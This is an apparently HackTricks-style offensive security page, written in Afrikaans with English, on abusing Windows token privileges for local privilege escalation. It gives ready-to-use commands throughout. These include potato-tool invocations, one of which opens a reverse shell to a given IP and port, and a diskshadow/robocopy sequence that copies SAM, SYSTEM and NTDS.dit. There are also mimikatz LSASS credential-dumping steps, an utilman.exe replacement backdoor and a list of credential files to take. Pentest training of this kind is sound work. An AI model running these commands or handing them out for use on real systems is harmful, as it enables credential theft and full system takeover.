# Misbruik Tokens

{{#include ../../banners/hacktricks-training.md}}

## Tokens

As jy **nie weet wat Windows Access Tokens is nie**, lees hierdie bladsy voordat jy verder gaan:


{{#ref}}
access-tokens.md
{{#endref}}

**Miskien kan jy privileges eskaleer deur die tokens wat jy reeds het, te misbruik**

### SeImpersonatePrivilege

Dit is privilege wat deur enige proses gehou word en die impersonation toelaat (maar nie creation nie) van enige token, mits 'n handle daartoe verkry kan word. 'n Geprivilegieerde token kan van 'n Windows service (DCOM) verkry word deur dit te dwing om NTLM authentication teen 'n exploit uit te voer, en daarna die uitvoering van 'n proses met SYSTEM privileges moontlik te maak. Hierdie vulnerability kan met verskeie tools uitgebuit word, soos [juicy-potato](https://github.com/ohpe/juicy-potato), [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) (wat vereis dat winrm disabled is), [SweetPotato](https://github.com/CCob/SweetPotato), en [PrintSpoofer](https://github.com/itm4n/PrintSpoofer).

Moderne operator notas:

- **JuicyPotato is legacy**: op Windows 10 1809+/Server 2019+, verkies **GodPotato**, **SigmaPotato**, **PrintNotifyPotato**, **RoguePotato**, **SharpEfsPotato/EfsPotato**, of **PrintSpoofer** afhangend van watter RPC/COM surface nog bereikbaar is.
- As jy 'n service gekompromitteer het wat as **`LOCAL SERVICE`** of **`NETWORK SERVICE`** loop en `whoami /priv` toon 'n **filtered token** sonder `SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege`, herstel eers die rekening se **default privilege set** (byvoorbeeld met **FullPowers**) en probeer daarna weer die potato family.
- Sommige nuwer forks is meer operator-friendly as die oorspronklike tools. Byvoorbeeld, **SigmaPotato** voeg reflection/in-memory execution en moderne Windows compatibility by, terwyl **PrintNotifyPotato** die PrintNotify COM service misbruik en dikwels nuttig is wanneer die klassieke Spooler path gedeaktiveer is.
```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

Dit is baie soortgelyk aan **SeImpersonatePrivilege**, dit sal dieselfde metode gebruik om 'n bevoorregte token te kry.\
Dan laat hierdie privilege jou toe om 'n primêre token toe te ken aan 'n nuwe/gesuspendeerde proses. Met die bevoorregte impersonation token kan jy 'n primêre token aflei (DuplicateTokenEx).\
Met die token kan jy 'n nuwe proses skep met 'CreateProcessAsUser' of 'n proses gesuspendeer skep en die token stel (oor die algemeen kan jy nie die primêre token van 'n lopende proses wysig nie).

### SeTcbPrivilege

As jy hierdie token geaktiveer het, kan jy **KERB_S4U_LOGON** gebruik om 'n **impersonation token** vir enige ander gebruiker te kry sonder om die credentials te ken, 'n arbitrêre groep (admins) by die token te voeg, die **integrity level** van die token op "**medium**" te stel, en hierdie token aan die **huidige thread** toe te ken (SetThreadToken).

### SeBackupPrivilege

Die stelsel word deur hierdie privilege veroorsaak om **alle lees-toegang** tot enige lêer toe te staan (beperk tot lees-operasies). Dit word gebruik om die wagwoord hashes van plaaslike Administrator-rekeninge uit die registry te lees, waarna gereedskap soos "**psexec**" of "**wmiexec**" met die hash gebruik kan word (Pass-the-Hash technique). Hierdie technique misluk egter onder twee toestande: wanneer die Local Administrator-rekening gedeaktiveer is, of wanneer daar 'n policy in plek is wat administratiewe regte verwyder van Local Administrators wat op afstand koppel.\
In praktyk is die mees betroubare ingeboude workflow gewoonlik **VSS + `robocopy /b`**: skep/onthul 'n shadow copy, en kopieer dan `SAM`/`SYSTEM` of `NTDS.dit` in **backup mode**, wat die file ACLs omseil.
```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```
Jy kan hierdie **privilege abuse** met:

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- following **IppSec** in [https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec)
- Or soos verduidelik in die **escalating privileges with Backup Operators**-afdeling van:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

Toestemming vir **write access** tot enige stelsellêer, ongeag die lêer se Access Control List (ACL), word deur hierdie privilege voorsien. Dit open talle moontlikhede vir escalation, insluitend die vermoë om **services te modify**, DLL Hijacking uit te voer, en **debuggers** via Image File Execution Options in te stel, onder verskeie ander techniques.

### SeCreateTokenPrivilege

SeCreateTokenPrivilege is 'n kragtige toestemming, veral nuttig wanneer 'n gebruiker die vermoë het om tokens te impersonate, maar ook in die afwesigheid van SeImpersonatePrivilege. Hierdie vermoë hang af van die vermoë om 'n token te impersonate wat dieselfde gebruiker voorstel en waarvan die integrity level nie dié van die current process oorskry nie.

**Key Points:**

- **Impersonation without SeImpersonatePrivilege:** Dit is moontlik om SeCreateTokenPrivilege vir EoP te leverage deur tokens onder spesifieke conditions te impersonate.
- **Conditions for Token Impersonation:** Suksesvolle impersonation vereis dat die target token aan dieselfde gebruiker behoort en 'n integrity level het wat minder as of gelyk aan die integrity level van die process is wat die impersonation probeer.
- **Creation and Modification of Impersonation Tokens:** Users kan 'n impersonation token skep en dit verbeter deur 'n privileged group's SID (Security Identifier) by te voeg.

### SeLoadDriverPrivilege

Hierdie privilege laat toe om **device drivers te load en unload** met die skepping van 'n registry entry met spesifieke waardes vir `ImagePath` en `Type`. Aangesien direkte write access tot `HKLM` (HKEY_LOCAL_MACHINE) beperk is, moet `HKCU` (HKEY_CURRENT_USER) eerder gebruik word. Om egter `HKCU` vir die kernel herkenbaar te maak vir driver configuration, moet 'n spesifieke path gevolg word.

Moderne offensive gebruik is gewoonlik **BYOVD** (bring your own vulnerable driver): load 'n **signed but vulnerable** kernel driver en gebruik dan sy IOCTLs om protections te disable of na kernel code execution te spring. Hou in gedagte dat op onlangse Windows 11/Server builds die **Microsoft vulnerable driver blocklist** en/of **HVCI/Memory Integrity** dikwels ou public chains breek, so die klassieke `szkg64.sys`-styl voorbeelde is nie meer universeel betroubaar nie.

Hierdie path is `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`, waar `<RID>` die Relative Identifier van die current user is. Binne `HKCU` moet hierdie hele path geskep word, en twee values moet ingestel word:

- `ImagePath`, wat die path na die binary is wat uitgevoer moet word
- `Type`, met 'n value van `SERVICE_KERNEL_DRIVER` (`0x00000001`).

**Steps to Follow:**

1. Access `HKCU` in plaas van `HKLM` as gevolg van beperkte write access.
2. Skep die path `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` binne `HKCU`, waar `<RID>` die current user's Relative Identifier voorstel.
3. Stel die `ImagePath` in op die binary se execution path.
4. Ken die `Type` toe as `SERVICE_KERNEL_DRIVER` (`0x00000001`).
```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```
Meer maniere om hierdie privilege te abuse in [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege)

### SeTakeOwnershipPrivilege

Dit is soortgelyk aan **SeRestorePrivilege**. Die primêre funksie laat ’n proses toe om **eienaarskap van ’n object te aanvaar**, en omseil die vereiste vir eksplisiete discretionary access deur die verskaffing van WRITE_OWNER access rights. Die proses behels eers om eienaarskap van die beoogde registry key vir skryfpurposes te verkry, en dan die DACL aan te pas om write operations moontlik te maak.
```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```
### SeDebugPrivilege

Hierdie privilege laat jou toe om **ander prosesse te debug**, insluitend om in die memory te lees en te skryf. Verskeie strategies vir memory injection, wat die meeste antivirus en host intrusion prevention solutions kan ontduik, kan met hierdie privilege gebruik word.

Op moderne Windows, onthou dat `SeDebugPrivilege` gewoonlik genoeg is om **non-protected SYSTEM processes** oop te maak en hul tokens te duplicate, maar dit is **nie** ’n waarborg dat jy **LSASS** kan raak nie. As **RunAsPPL / LSA Protection** geaktiveer is, kan non-protected processes nie LSASS lees of daarin inject nie, selfs al is `SeDebugPrivilege` teenwoordig. In daardie geval, steel ’n token van ’n ander non-PPL SYSTEM process, of chain met ’n PPL bypass/BYOVD in plaas daarvan om te veronderstel `procdump` sal werk. Vir ’n volledige token-copy example met behulp van `SeDebugPrivilege` + `SeImpersonatePrivilege`, kyk [this page](sedebug-+-seimpersonate-copy-token.md).

#### Dump memory

Jy kan [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) gebruik van die [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) om **the memory of a process** te capture. Meer spesifiek kan dit toegepas word op die **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)** process, wat verantwoordelik is vir die stoor van user credentials sodra ’n gebruiker suksesvol by ’n system aangemeld het.

Jy kan dan hierdie dump in mimikatz laai om passwords te verkry:
```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```
#### RCE

As jy 'n `NT SYSTEM` shell wil kry, kan jy gebruik maak van:

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)
```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```
### SeManageVolumePrivilege

Hierdie reg (Perform volume maintenance tasks) laat toe om raw volume device handles oop te maak (bv., \\.\C:) vir direkte disk I/O wat NTFS ACLs omseil. Daarmee kan jy grepe van enige lêer op die volume kopieer deur die onderliggende blocks te lees, wat arbitrêre file read van sensitiewe materiaal moontlik maak (bv., machine private keys in %ProgramData%\Microsoft\Crypto\, registry hives, SAM/NTDS via VSS). Dit het veral groot impak op CA servers waar die exfiltrating van die CA private key die forging van 'n Golden Certificate moontlik maak om enige principal te impersonate.

Sien gedetailleerde techniques en mitigations:

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{#endref}}

## Check privileges
```
whoami /priv
```
Die **tokens wat as Disabled verskyn** kan gewoonlik geaktiveer word, so jy kan dikwels beide _Enabled_ en _Disabled_ privileges abuse.

### Enable All the tokens

As jy disabled privileges het, kan jy die script [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) gebruik om al die tokens te enable:
```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```
Of the **script** ingebed in hierdie [**post**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/).

## Table

Volledige token privileges cheatsheet by [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin), die samevatting hieronder sal net direkte maniere lys om die privilege te misbruik om 'n admin session te verkry of sensitiewe files te lees.

| Privilege                  | Impact      | Tool                    | Execution path                                                                                                                                                                                                                                                                                                                                     | Remarks                                                                                                                                                                                                                                                                                                                        |
| ------------------------- | ----------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`SeAssignPrimaryToken`** | _**Admin**_ | 3rd party tool          | _"It would allow a user to impersonate tokens and privesc to nt system using tools such as potato.exe, rottenpotato.exe and juicypotato.exe"_                                                                                                                                                                                                      | Dankie [Aurélien Chalot](https://twitter.com/Defte_) vir die update. Ek sal probeer om dit binnekort na iets meer recipe-like te her-phrase.                                                                                                                                                                                         |
| **`SeBackup`**             | **Threat**  | _**Built-in commands**_ | Lees sensitiewe files met `robocopy /b` of dedicated SeBackup-aware copy helpers.                                                                                                                                                                                                                                                                 | <p>- Great vir `SAM`/`SYSTEM`, `SECURITY`, `NTDS.dit`, en soms `%WINDIR%\MEMORY.DMP`.<br><br>- `robocopy` is convenient, maar dedicated SeBackup cmdlets/APIs is dikwels meer flexible vir locked/open files.</p>                                                                                                   |
| **`SeCreateToken`**        | _**Admin**_ | 3rd party tool          | Skep arbitrary token insluitend local admin rights met `NtCreateToken`.                                                                                                                                                                                                                                                                          |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**Admin**_ | **PowerShell**          | Duplicateer 'n **non-PPL** SYSTEM token of dump memory from a non-protected process.                                                                                                                                                                                                                                                                 | <p>LSASS dumping word commonly geblokkeer as RunAsPPL/LSA Protection enabled is.</p><p>Script to be found at [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)</p>                                                                                                               |
| **`SeImpersonate`**        | _**Admin**_ | 3rd party tool          | Gebruik die **Potato family** / named-pipe impersonation om SYSTEM te spawn (`PrintSpoofer`, `RoguePotato`, `GodPotato`, `SigmaPotato`, `PrintNotifyPotato`, etc.).                                                                                                                                                                                    | <p>Most practical from service accounts such as IIS APPPOOL, MSSQL, scheduled tasks, or any context that already owns `SeImpersonatePrivilege`.</p>                                                                                                                                                                            |
| **`SeLoadDriver`**         | _**Admin**_ | 3rd party tool          | <p>1. Laai 'n signed-but-vulnerable kernel driver (BYOVD)<br>2. Gebruik die driver's IOCTLs om kernel R/W te kry, security tooling te disable, of na SYSTEM te elevate<br><br>Alternatief kan die privilege gebruik word om security-related drivers te unload met <code>fltMC</code> builtin command, i.e. <code>fltMC sysmondrv</code></p>                     | <p>Older public drivers soos <code>szkg64.sys</code> word toenemend geblokkeer op modern Windows deur die vulnerable-driver blocklist / HVCI.</p>                                                                                                                                                                               |
| **`SeRestore`**            | _**Admin**_ | **PowerShell**          | <p>1. Launch PowerShell/ISE met die SeRestore privilege present.<br>2. Enable die privilege met <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a>).<br>3. Hernoem utilman.exe na utilman.old<br>4. Hernoem cmd.exe na utilman.exe<br>5. Lock die console en press Win+U</p> | <p>Attack may be detected by some AV software.</p><p>Alternative method relies on replacing service binaries stored in "Program Files" using the same privilege</p>                                                                                                                                                            |
| **`SeTakeOwnership`**      | _**Admin**_ | _**Built-in commands**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. Hernoem cmd.exe na utilman.exe<br>4. Lock die console en press Win+U</p>                                                                                                                                       | <p>Attack may be detected by some AV software.</p><p>Alternative method relies on replacing service binaries stored in "Program Files" using the same privilege.</p>                                                                                                                                                           |
| **`SeTcb`**                | _**Admin**_ | 3rd party tool          | <p>Manipuleer tokens om local admin rights ingesluit te hê. May require SeImpersonate.</p><p>To be verified.</p>                                                                                                                                                                                                                                     |                                                                                                                                                                                                                                                                                                                                |

## References

- Take a look to this table defining Windows tokens: [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin)
- Take a look to [**this paper**](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt) about privesc with tokens.
- itm4n – Give Me Back My Privileges! Please? (restricted service tokens / FullPowers): https://itm4n.github.io/localservice-privileges/
- Microsoft – Robocopy (`/b` backup mode bypasses file/folder ACL checks): https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy
- Microsoft – Perform volume maintenance tasks (SeManageVolumePrivilege): https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks
- 0xdf – HTB: Certificate (SeManageVolumePrivilege → CA key exfil → Golden Certificate): https://0xdf.gitlab.io/2025/10/04/htb-certificate.html

{{#include ../../banners/hacktricks-training.md}}
